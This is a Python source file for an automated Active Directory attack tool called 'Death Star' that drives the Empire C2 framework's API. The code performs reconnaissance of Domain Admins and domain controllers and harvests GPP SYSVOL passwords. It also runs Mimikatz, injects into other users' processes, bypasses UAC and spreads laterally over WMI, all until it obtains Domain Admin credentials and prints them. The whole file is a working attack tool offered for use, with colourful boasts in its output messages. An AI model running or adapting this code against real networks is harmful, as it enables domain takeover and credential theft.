import requests
import argparse
import os
import threading
import signal
import sys
import re
from time import sleep
from requests import ConnectionError
from IPython import embed

#The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class KThread(threading.Thread):
    """
    A subclass of threading.Thread, with a kill() method.
    From https://web.archive.org/web/20130503082442/http://mail.python.org/pipermail/python-list/2004-May/281943.html
    """

    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run      # Force the Thread toinstall our trace.
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True

def login(empire_username, empire_password):

    payload = {'username': empire_username,
               'password': empire_password}

    print('[*] Powering up the Death Star')
    r = requests.post(base_url + '/api/admin/login', json=payload, headers=headers, verify=False)

    if r.status_code == 200:
        token['token'] = r.json()['token']
    else:
        print('[-] I find your lack of faith disturbing... (Authentication Failed)')
        sys.exit(1)

def get_listener_by_name(listener_name='DeathStar'):
    r = requests.get(base_url + '/api/listeners/{}'.format(listener_name), params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    return False

def start_listener(listener_options, listener_type='http'):
    r = requests.post(base_url + '/api/listeners/{}'.format(listener_type), params=token, headers=headers, json=listener_options, verify=False)
    if r.status_code == 200:
        r = r.json()
        print('[*] Created Death Star listener => {}'.format(r))
        return r
    print(r.json())
    raise

def get_agents():
    r = requests.get(base_url + '/api/agents', params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise

def get_agent_results(agent_name):
    r = requests.get(base_url + '/api/agents/{}/results'.format(agent_name), params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise

def run_shell_command(agent_name, command):
    payload = { 'command': command} 

    r = requests.post(base_url + '/api/agents/{}/shell'.format(agent_name), params=token, headers=headers, json=payload, verify=False)
    if r.status_code == 200:
        r = r.json()
        if debug: print("[DEBUG] Agent: {} Executed Shell Command => success: {} taskID: {}".format(agent_name, r['success'], r['taskID']))
        return r
    print(r.json())
    raise

def run_shell_command_with_results(agent_name, command):
    r = run_shell_command(agent_name, command)
    while True:
        for result in get_agent_results(agent_name)['results']:
            #if debug: print('[DEBUG] Agent: {} => Result Buffer: {}'.format(agent_name, result))
            if result['taskID'] == r['taskID']:
                if len(result['results'].split('\n')) > 1:
                    return result['results']
        sleep(2)

def execute_module(module_name, agent_name, module_options=None):
    payload = {'Agent': agent_name}
    if module_options:
        payload.update(module_options)

    r = requests.post(base_url + '/api/modules/{}'.format(module_name), params=token, headers=headers, json=payload, verify=False)
    if r.status_code == 200:
        r = r.json()
        if debug: print("[DEBUG] Agent: {} Executed Module => success: {} taskID: {} msg: '{}'".format(agent_name, r['success'], r['taskID'], r['msg']))
        return r
    print(r.json())
    raise

def execute_module_with_results(module_name, agent_name, module_options=None):
    r = execute_module(module_name, agent_name, module_options)
    while True:
        for result in get_agent_results(agent_name)['results']:
            #if debug: print('[DEBUG] Agent: {} => Result Buffer: {}'.format(agent_name, result))
            if result['taskID'] == r['taskID']:
                if len(result['results'].split('\n')) > 1 or not result['results'].startswith('Job'):
                    return result['results']
        sleep(2)

def get_agent_logged_events(agent_name):
    r = requests.get(base_url + '/api/reporting/agent/{}'.format(agent_name), params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise

def get_stored_credentials():
    r = requests.get(base_url + '/api/creds', params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise

def delete_all_agent_results():
    r = requests.delete(base_url + '/api/agents/all/results', params=token, verify=False)
    if r.status_code == 200:
        return r.json()
    print(r.json())
    raise

###########################################################################################################################################

def get_group_member(agent_name, group_name='"Domain Admins"'):
    module_options = {'GroupName': group_name}

    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_group_member', agent_name, module_options)
    results = results.strip().split('\r\n\r\n')[:-2]
    members = []
    for result in results:
        if result.startswith('Job'):
            continue

        user   = None
        domain = None
        for entry in result.split('\r\n'):
            if entry.startswith('MemberDomain'):
                domain = entry.split(':')[1].strip().split('.')[0].upper()
            if entry.startswith('MemberName'):
                user = entry.split(':')[1].strip()

        if user and domain: members.append('{}\\{}'.format(domain, user))

    print("[+] Agent: {} => Found {} members for the '{}' group: {}".format(agent_name, len(members), group_name, members))

    return members

def get_domain_controller(agent_name):
    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_domain_controller', agent_name)
    results = results.strip().split('\r\n')
    dcs = []
    for entry in results:
        if entry.startswith('Name'):
            dcs.append(entry.split(':')[1].strip())

    print('[+] Agent: {} => Found {} Domain Controllers: {}'.format(agent_name, len(dcs), dcs))

    return dcs

def user_hunter(agent_name, group_name='"Domain Admins"', threads=5, no_ping=False):
    module_options = {'GroupName': group_name,
                      'Threads'  : str(int(threads))}

    if no_ping:
        module_options['NoPing'] = str(bool(no_ping))

    results = execute_module_with_results('powershell/situational_awareness/network/powerview/user_hunter', agent_name, module_options)
    results = results.strip().split('\r\n\r\n')[:-2]

    admin_sessions = []
    for section in results:
        if section.startswith('Job'):
            continue

        session = {}
        for entry in section.split('\r\n'):
            if entry.startswith('UserDomain'):
                session['domain'] = entry.split(':')[1].strip().split('.')[0].upper()
            if entry.startswith('UserName'):
                session['username'] = entry.split(':')[1].strip()
            if entry.startswith('ComputerName'):
                session['hostname'] = entry.split(':')[1].strip()

        if session: admin_sessions.append(session)

    print('[+] Agent: {} => Found {} active Admin sessions: {}'.format(agent_name, len(admin_sessions), [session['hostname'] for session in admin_sessions]))

    return admin_sessions

def find_localadmin_access(agent_name, threads=5, no_ping=False, computer_name=''):
    module_options = {'ComputerName': computer_name}
    if threads:
      module_options['Threads'] = str(int(threads))
    if no_ping:
      module_options['NoPing'] = str(bool(no_ping))

    results = execute_module_with_results('powershell/situational_awareness/network/powerview/find_localadmin_access', agent_name, module_options)
    if results.startswith('Job'):
        results = results.strip()[19:].split('\r\n')
    else:
        results = results.strip().split('\r\n')

    # Deletes the '\nFind-LocalAdminAccess completed!' string and a rogue '\n'
    results = results[:-2]

    if not computer_name:
        print('[+] Agent: {} => Current security context has admin access to {} hosts'.format(agent_name, len(results)))
    else:
        if not results:
            print('[-] Agent: {} => Current security context does not have admin access to {}'.format(agent_name, computer_name))
        else:
            print('[+] Agent: {} => Current security context has admin access to {}'.format(agent_name, computer_name))

    return results

def find_gpo_location(agent_name):
    pass

def find_gpo_computer_admin(agent_name):
    pass

def get_gpo_computer(agent_name, GUID):
    module_options = {'GUID': GUID}
    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_gpo_computer', agent_name, module_options)
    if results.startswith('Job'):
        results = results.strip()[19:].split('\r\n')
    else:
        results = results.strip().split('\r\n')

    # Deletes the '\nGet-GPOComputer completed!' string and a rogue '\n'
    results = results[:-2]

    print('[+] Agent: {} => GPO {} is applied to {} computers'.format(agent_name, GUID, len(results)))

    return results

def tokens(agent_name):
    pass
    #results = execute_module_with_results('powershell/credentials/tokens', agent_name)

def gpp(agent_name):
    results = execute_module_with_results('powershell/privesc/gpp', agent_name)
    results = results.split('\r\n\r\n')
    
    gpps = []
    for result in results:
        entries = result.split('\r\n')
 
        gpp = {}
        usernames = []
        passwords = []
        file = None
        for entry in entries:
            if entry.startswith('UserNames'):
                usernames = list(map(str.strip, entry.split(':')[1].strip().split(',')))
                if usernames: 
                    usernames[0]  = usernames[0][1:]
                    usernames[-1] = usernames[-1][:-1]
                    # Some usernames get returned with '(built-in) appended to them, this takes care of that
                    usernames = [user.replace(' (built-in)', '') for user in usernames]

            if entry.startswith('Passwords'):
                passwords = list(map(str.strip, entry.split(':')[1].strip().split(',')))
                if passwords: 
                    passwords[0]  = passwords[0][1:]
                    passwords[-1] = passwords[-1][:-1]

            if entry.startswith('File'):
                file_index = entries.index(entry)
                file = entry.split(':')[1].strip()
                for remainder in entries[file_index+1:]:
                    file += remainder.strip()

        if file is not None and (usernames and passwords):
            gpp['file'] = file
            gpp['guid'] = file.split('\\')[6][1:-1]
            if not len(gpp['guid']) == 36:
                raise

            gpp['creds'] = dict(zip(usernames, passwords))
            gpps.append(gpp)

    print('[+] Agent: {} => Found {} credentials using GPP SYSVOL privesc'.format(agent_name, len(gpps)))

    return gpps

def get_loggedon(agent_name, computer_name='localhost'):
    module_options = {'ComputerName': computer_name}

    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_loggedon', agent_name, module_options)
    results = results.strip().split('\r\n')[4:-4]

    loggedon_users = []
    for entry in results:
        if not entry or entry.find('$') != -1:
            continue

        entry = re.sub(' +', ' ', entry.strip())
        username, domain, logon_server,_= entry.split()
        user = '{}\\{}'.format(domain, username)
        if user not in loggedon_users:
            loggedon_users.append(user)

    print('[+] Agent: {} => Found {} users logged into {}: {}'.format(agent_name, len(loggedon_users), computer_name, loggedon_users))

    return loggedon_users

def tasklist(agent_name, process=None, username=None):
    command = 'tasklist'
    if process:
        command += ' {}'.format(process)

    results = run_shell_command_with_results(agent_name, command)
    results = results.split('\r\n')[2:]
    processes = []

    for entry in results:
        # This is convoluted because it takes into account process names with multiple spaces
        entry = re.sub(' +', ' ', entry.strip()).split()

        pid_index = None
        for v in entry:
            if v.isdigit():
                pid_index = entry.index(v)
                break

        if len(entry[pid_index:]) == 5:
            pid, arch, user, _,_ = entry[pid_index:]
            name = ' '.join(entry[:pid_index])
        elif not pid_index and len(entry) == 1 and not entry[0].isdigit():
            processes[-1]['username'] = processes[-1]['username'] + entry[0]
        else:
            print(entry)
            raise

        if username and username == user:
            if not list(filter(lambda proc: proc['pid'] == pid, processes)):
                processes.append({'name': name, 'pid': pid, 'arch': arch, 'username': user})
        else:
            if not list(filter(lambda proc: proc['pid'] == pid, processes)):
                processes.append({'name': name, 'pid': pid, 'arch': arch, 'username': user})

    print('[+] Agent: {} => Enumerated {} processes'.format(agent_name, len(processes)))

    return processes

def psinject(agent_name, process, listener='DeathStar'):
    module_options = {'Listener': listener}
    if process.isdigit():
        module_options['ProcId'] = process
    else:
        module_options['ProcName'] = process
    module_options['Listener'] = listener

    print('[*] Agent: {} => PSInjecting into process {}'.format(agent_name, process))
    execute_module('powershell/management/psinject', agent_name, module_options)

def invoke_wmi(agent_name, computer_name, listener='DeathStar', username='', password=''):
    module_options = {'ComputerName': computer_name,
                      'Listener': listener,
                      'UserName': username,
                      'Password': password}

    results = execute_module_with_results('powershell/lateral_movement/invoke_wmi', agent_name, module_options)
    if results.lower().startswith('invoke-wmi executed'):
        print('[+] Agent: {} => Spread laterally using {} to {}'.format(agent_name, 
                                                                        '{} credentials'.format(username) if username and password else 'current security context',
                                                                        computer_name))

    elif results.startswith('error'):
        print("[-] Agent: {} => Failed to spread laterally using {} to {}: '{}'".format(agent_name, 
                                                                                       '{} credentials'.format(username) if username and password else 'current security context',
                                                                                       computer_name,
                                                                                       results))

def mimikatz(agent_name):
    results = execute_module_with_results('powershell/credentials/mimikatz/logonpasswords', agent_name)
    if results: print('[+] Agent: {} => Executed Mimikatz'.format(agent_name))

def spawnas(agent_name, listener='DeathStar', cred_id='', username='', password=''):
    module_options = { 'Listener': listener,
                       'CredID': cred_id,
                       'Username': username,
                       'Password': password}

    print('[*] Agent: {} => Spawning new Agent {}'.format(agent_name, 'as {}'.format(username) if username and password else 'using CredID {}'.format(cred_id)))
    execute_module('powershell/management/spawnas', agent_name, module_options)

def bypassuac_eventvwr(agent_name, listener='DeathStar'):
    module_options = {'Listener': listener}

    print('[*] Agent: {} => Attempting to elevate using bypassuac_eventvwr'.format(agent_name))
    execute_module('powershell/privesc/bypassuac_eventvwr', agent_name, module_options)

#########################################################################################################################################

def recon(agent_name):
    if running_under_domain_account(agent_name):
        print('[*] Agent: {} => Starting recon'.format(agent_name))
        for member in get_group_member(agent_name):
            domain_admins.append(member)

        for dc in get_domain_controller(agent_name):
            domain_controllers.append(dc)

        for session in user_hunter(agent_name, no_ping=True):
            if session['hostname'] not in priority_targets:
                priority_targets.append(session['hostname'])

    del recon_threads[agent_name]

def elevate(agent_name):
    bypassuac_eventvwr(agent_name)

def spread(agent_name):
    if running_under_domain_account(agent_name):
        if agents[agent_name]['username'] not in spread_usernames:
            spread_usernames.append(agents[agent_name]['username'])

            print('[*] Agent: {} => Starting lateral movement'.format(agent_name))
            if priority_targets:
                for box in priority_targets:
                    if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, no_ping=True, computer_name=box):
                        invoke_wmi(agent_name, box, 'DeathStar')

            for box in find_localadmin_access(agent_name, no_ping=True):
                # Do we have an agent on the box? if not pwn it
                if not agent_on_host(hostname=box):
                    invoke_wmi(agent_name, box, 'DeathStar')

def privesc(agent_name):
    if running_under_domain_account(agent_name):
        print('[*] Agent: {} => Starting domain privesc'.format(agent_name))
        for result in gpp(agent_name):
            for box in get_gpo_computer(agent_name, result['guid']):
                for username, password in result['creds'].items():
                    if not agent_on_host(hostname=box):
                        # These are local accounts so we append '.\' to the username to specify it
                        invoke_wmi(agent_name, box, 'DeathStar', '.\\' + username, password)

        tried_domain_privesc = True

    del privesc_threads[agent_name]

def pwn_the_shit_out_of_everything(agent_name):
    '''
    This is the function that takes care of the logic for each agent thread
    '''

    if (not domain_controllers or not domain_admins or not priority_targets) and not recon_threads:
        recon_threads[agent_name] = 'u w0t m8'
        recon(agent_name)
        #recon_threads[agent_name] = KThread(target=recon, args=(agent_name,))
        #recon_threads[agent_name].start()

    for user in get_loggedon(agent_name):
        if user in domain_admins:
            print('[+] Agent: {} => Found Domain Admin logged in: {}'.format(agent_name, user))

    spread_threads[agent_name] = KThread(target=spread, args=(agent_name,))
    spread_threads[agent_name].start()

    if not tried_domain_privesc and not privesc_threads:
        privesc_threads[agent_name] = KThread(target=privesc, args=(agent_name,))
        privesc_threads[agent_name].start()

    if agents[agent_name]['high_integrity']:
        tokens(agent_name)

        if agents[agent_name]['os'].lower().find('windows 7') != -1:
            mimikatz_thread = KThread(target=mimikatz, args=(agent_name,))
            mimikatz_thread.daemon = True
            mimikatz_thread.start()

        #powerdump()

        # This doesn't need to be explorer, change it at will ;)
        for process in tasklist(agent_name, process='explorer'):
            if process['username'] != agents[agent_name]['username'] and process['username'] != 'N/A' and process['username'] not in spread_usernames:
                print('[*] Agent: {} => Found process {} running under {}'.format(agent_name, process['pid'], process['username']))
                psinject(agent_name, process['pid'])

    if not agents[agent_name]['high_integrity']:
        elevate(agent_name)

############################################################################################################################################

def running_under_domain_account(agent_name):
    hostname = agents[agent_name]['hostname']
    username = agents[agent_name]['username']

    if username.split('\\')[0] != hostname and username.split('\\')[1] != 'SYSTEM':
        return True
    return False

def agent_on_host(hostname=None, ip=None):
    agent_on_host = False
    for name, info in agents.items():
        if hostname and info['hostname'].lower() == hostname.split('.')[0].lower():
            agent_on_host = True
            break
        elif ip and info['ip'] == ip:
            agent_on_host = True
            break

    return agent_on_host

def agent_finished_initializing(agent_dict):
    '''
    If these values are None it means the agent hasn't finished initializing on the target
    '''
    if agent_dict['username'] is None or agent_dict['hostname'] is None or agent['os_details'] is None:
        return False
    return True

def print_win_banner(msg, agent_name=None):
    print('\n[+] {}{}'.format('Agent: {} => '.format(agent_name) if agent_name else '', msg))
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")

def signal_handler(signal, frame):
    print('\n[*] Powering down...')
    for name, thread in recon_threads.items():
        print('[*] Killing recon thread for Agent {}'.format(name))
        del recon_threads[name]
        #thread.kill()

    for name, thread in spread_threads.items():
        print('[*] Killing spread thread for Agent {}'.format(name))
        thread.kill()

    for name, thread in privesc_threads.items():  
        print('[*] Killing privesc thread for Agent {}'.format(name))
        thread.kill()

    for name, thread in agent_threads.items():
        print('[*] Killing thread for Agent {}'.format(name))
        thread.kill()

    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

if __name__ == '__main__':

    logo = """
                                         .;+###+;.                             
                                    .#@@@@@@@@@@@@@@                           
                                 `@@@@@@@@@@@@@@+                              
                               ;@@@@@@@@@@@@@@@@@@@@                           
                             ;@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                           `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                          #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'                   
                        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                  
                      `@@@@@@,     `@@@@@@@@@@@@@@@@@@@@@@@@@@@@               
                     `@@@@@`  '@@@@` .@@@@@@@@@@@@@@@@@@@@@@@@                 
                     @@@@@  @@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@                 
                    @@@@# '@@@@@@@@@@@ ,@@@@@@@@@@@@@@@@@@@@@                  
                   @@@@@ +@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@                  
                  #@@@@ '@@@@@@@@@@@@@@``@@@@@@@@@@@@@@@@@@@@@                 
                 `@@@@. @@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@++##'           
                 @@@@@ @@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@           
                :@@@@`.@@@@@@@@@@@@@@@@@ +@@@@@@@@@@@@@@@@@@@@@#               
                @@@@@ @@@@@@@@@@@@@@@@@@ ;@@@@@@@@@@@@@@@@@@@@@@.              
               '@@@@@ @@@@@@@@@@@@@@@@@@ +@@@@@@@@@@@@@@@@@@@@@@@.             
               @@@@@,.@@@@@@@@@@'@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@#              
              .@@@@@ ;@@@@@@@@@. @@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@               
              @@@@@@ '@@@@@@@@@@'@@@@@@' @@@@@@@@@@@@@@@@@@@@@@@               
              @@@@@@ :@@@@@@@@@@@@@@@@@ '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;      
             ,@@@@@@` @@@@@@@@@@@@@@@@# @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:      
             @@@@@@@+ @@@@@@@@@@@@@@@@ '@@@@@@@@@@@@@@@@@@@@@@@@@@             
             @@@@@@@@ +@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@+        ``   
             @@@@@@@@. @@@@@@@@@@@@@. @@@@@@@@@@@@@@@@@@@@@@@@@@@+::      @@   
             @@@@@@@@@ `@@@@@@@@@@@` @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;     @@   
            .@@@@@@@@@@  @@@@@@@@#  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;@@  ;
            ;@@@@@@@@@@@  ,@@@@:  `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@
            +@@@@@@@@@@@@@      `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
            # @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@`
            +@# @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@' @
            '@@@@ ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@; @@@
            ,@@@@@@; '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ :@@@@+
             @@@@@@@@@' `#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@; :@@@@@@+ 
             @@@@@@@@@@@@@'  .+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+, :@@@@@@@@@@  
             @@@@@@@@@@@@@@@@@@+,   `,;+@@@@@@@@@@@@@@@+:.  `;@@@@@@@@@@@;@@   
             @@@@@@@@@@@@@@@@@@@@@@@@@@@#+;;::,,::;'+@@@@@@@@@@@@@@@@@@@  @@   
             :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@   
              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   ,,   
              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        
              ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        
               ''#@@@@@@@@@   '++@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+;      
                  @# #@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,,,,,,,,,,      
                  '@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
                   @@         @@@@@@@@@;''@@@@@@@@@@@@@@@@@@@@@                
                   @@      .:;@@@@`..`    `@@@@@@@@@@@@@@@@@@@@@@@@@@`         
                           #@@@@:.        `@@@@@@@@@@@@@@@@@@@@@@@@@@          
                              '@,      @@@@@@@@@@@@@@@@@@                      
                   ''.    ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ``             
                    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@            
                    ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
                     '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#,,,,,,:,                
                      '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:                        
                       :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                    
                        `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,:                      
                          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        
                           '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                               @@@@@@@@@@@@@@@@@,                              
                                 +@@@@@@@@@@@@@@                               
                                    #@@@@@@@@@@@@`                             
                                        :#@@@@@@@

    It's as if millions of admins suddenly cried out in terror and were suddenly silenced.

"""

args = argparse.ArgumentParser(description='Death Star')
args.add_argument('-u', '--username', type=str, default='empireadmin', help='Empire username')
args.add_argument('-p', '--password', type=str, default='Password123', help='Empire password')
args.add_argument('-t', '--threads', type=int,  help='Specifies the number of threads for modules to use')
args.add_argument('--url', type=str, default='https://127.0.0.1:1337', help='Empire RESTful API URL')
args.add_argument('--debug', action='store_true', help='Enable debug output')

args = args.parse_args()

print(logo)
sleep(3)
os.system('clear')

headers = {'Content-Type': 'application/json'}
token = {'token': None}

gotz_da = False
tried_domain_privesc = False

base_url = args.url
debug = args.debug

agents  = {}

agent_threads   = {}
recon_threads   = {}
privesc_threads = {}
spread_threads  = {}

priority_targets   = [] # List of boxes with admin sessions
domain_controllers = []
domain_admins      = []
spread_usernames   = [] # List of accounts we already used to laterally spread

login(args.username, args.password)

if not get_listener_by_name():
    start_listener({'CertPath': 'data/empire.pem', 'Name': 'DeathStar', 'Port': 7654})

#delete_all_agent_results()

print('[*] Polling for agents')
while not gotz_da:
    for cred in get_stored_credentials()['creds']:
        # TO DO: for every credential, use the spawnas module max 2 times per agent
        if cred['credtype'] == 'plaintext':
            for da_acct in domain_admins:
                domain, username = da_acct.split('\\')
                if cred['username'] == username and cred['domain'].split('.')[0].upper() == domain:
                    print_win_banner('Got Domain Admin via credentials! => Username: {} Password: {}'.format(da_acct, cred['password']))
                    gotz_da = True
                    signal_handler(None, None)
                    break

    for agent in get_agents()['agents']:
        agent_name = agent['name']
        if agent_name not in agents.keys() and agent_finished_initializing(agent):
            print('[+] New Agent => ID: {} Name: {} IP: {} HostName: {} UserName: {} HighIntegrity: {}'.format(agent['ID'], agent['name'], agent['external_ip'], agent['hostname'], agent['username'], agent['high_integrity']))

            if agent['username'] in domain_admins and agent['high_integrity']:
                print_win_banner('Got Domain Admin via security context!', agent['name'])
                gotz_da = True
                signal_handler(None, None)
                break

            agents[agent_name] = {'id': agent['ID'],
                                       'ip': agent['external_ip'], 
                                       'hostname': agent['hostname'], 
                                       'username': agent['username'], 
                                       'high_integrity': agent['high_integrity'],
                                       'os': agent['os_details']}

            agent_threads[agent_name] = KThread(target=pwn_the_shit_out_of_everything, args=(agent_name,))
            agent_threads[agent_name].start()

    sleep(5)

sys.exit(0)
